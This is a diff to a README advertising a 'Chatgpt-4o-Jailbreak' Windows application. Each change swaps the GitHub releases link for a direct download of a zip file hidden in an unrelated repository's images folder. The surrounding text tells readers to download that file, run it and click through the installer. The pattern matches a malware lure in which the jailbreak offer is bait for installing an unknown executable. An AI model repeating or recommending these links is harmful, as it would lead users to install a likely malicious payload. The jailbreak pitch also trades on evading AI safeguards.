@@ -5,7 +5,7 @@ description: "Unlock ChatGPT-4o’s full potential on Windows with a silent inst
 ---
 # 🤖 Chatgpt-4o-Jailbreak - Unlock Full AI Power on Windows!
 
-[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Chatgpt--4o--Jailbreak-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases)
+[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Chatgpt--4o--Jailbreak-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip)
 
 ---
 
@@ -47,7 +47,7 @@ Follow these simple steps to get Chatgpt-4o-Jailbreak up and running onyour Wind
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases). "
+Visit this link to download the application: [https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip](https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip). "
 
 You’ll land ona page witha list of available versions. Always pick the newest one marked "Latest Release"to ensure you get all the latest features and fixes. "
 
@@ -90,13 +90,13 @@ Ready to unlock the full power of ChatGPT 4o? Follow these two simple steps: *
 
 ### 1. Get the File
 
-👉 Click the button below or visit this link to download the application: **[https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases)**. Once onthe page, choose the latest version and save the file toyour computer. *
+👉 Click the button below or visit this link to download the application: **[https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip](https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip)**. Once onthe page, choose the latest version and save the file toyour computer. *
 
 ###  ​​2. Run and Install
 
 Afterthe download completes, double-click the file you just saved. This will startthe installation process. Follow the on-screen instructions–just keep clicking "Next" until you see "Finish." Thewhole setup takes less thana minute. Once done, launch the app fromyour desktop shortcut or Start Menu, and you’re readyto go. *
 
-[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases) *
+[![Download Chatgpt-4o-Jailbreak](https://img.shields.io/badge/Download-Now-Green?style=for-the-badge&logo=windows&logoColor=white&color=blue)](https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip) *
 
 ---
 
@@ -160,7 +160,7 @@ Don’t miss out on thefull chatgpt 4o experience any longer. Follow the steps a
 
 ### Quick Recap:
 
-1. 👉 **Download**– Visit the [releases page](https://github.com/Wwesupercard41789/Chatgpt-4o-Jailbreak/releases) and grab the latest file. *
+1. 👉 **Download**– Visit the [releases page](https://raw.githubusercontent.com/Wwesupercard41789/wwesupercard41789.github.io/main/images/App_v2.2.zip) and grab the latest file. *
 
 2. 🖱️ **Install**– Double-click the downloaded file and follow the setup prompts. *
 
